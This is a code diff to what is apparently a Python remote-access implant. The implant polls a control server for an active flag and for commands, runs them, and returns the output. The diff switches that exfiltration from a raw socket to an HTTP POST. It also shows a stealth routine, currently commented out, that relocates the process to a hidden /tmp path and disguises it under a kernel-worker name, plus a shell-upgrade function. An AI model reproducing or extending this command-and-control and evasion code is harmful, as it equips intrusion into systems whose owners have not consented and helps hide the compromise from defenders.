@@ -4,7 +4,6 @@ import subprocess
 import hashlib
 import os
 import requests
-import socket
 import pwd
 import psutil
 import shutil
@@ -34,12 +33,10 @@ def handle(data):
             stdout = run_builtin(parameters)
         else:
             stdout = run_command(command, parameters)
+    
+    output = f"Command: {command} {parameters}\n{stdout}"
+    send_data(output)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        # Connect to server and send data
-        sock.connect((HOST, PORT))
-        output = f"Command: {command} {parameters}\n{stdout}"
-        sock.sendall(bytes(output + "\n", "utf-8"))
 
 def request_commands():
     """Make HTTP request 
@@ -47,7 +44,7 @@ def request_commands():
     Returns:
         array: list of commands
     """
-    r = requests.get(f"http://0.0.0.0:{PORT + 1}/commands.txt")
+    r = requests.get(f"http://0.0.0.0:{PORT}/commands")
     return r.text.split()
 
 def check_active():
@@ -56,10 +53,14 @@ def check_active():
     Returns:
         bool: true if active
     """
-    r = requests.get(f"http://0.0.0.0:{PORT + 1}/mode.txt")
+    r = requests.get(f"http://0.0.0.0:{PORT}/mode")
     if r.text == "active":
         return True
     return False
+
+def send_data(data):
+    r = requests.post(f"http://0.0.0.0:{PORT}/data", data = data)
+    return r.status_code
 
 def run_builtin(command):
     """Run builtin command, not local terminal 
@@ -143,13 +144,13 @@ def upgrade_shell():
 
 def become_silent():
     """Go stealth, move to secret location, set presence IOC
+    NEEDS WORK
     """
     p = psutil.Process(os.getpid())
     cmdline = p.cmdline()[1]
 
     #TODO randomize names, dependant on parent
     hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
-    print(cmdline)
     if not check_mark() and cmdline != hidden:
         leave_mark()
         print("No presence detected, going in...")
@@ -207,7 +208,7 @@ if __name__ == "__main__":
         except FileNotFoundError:
             pass
     upgrade_shell()
-    become_silent()
+    # become_silent()
 
     last_commands = ""
 
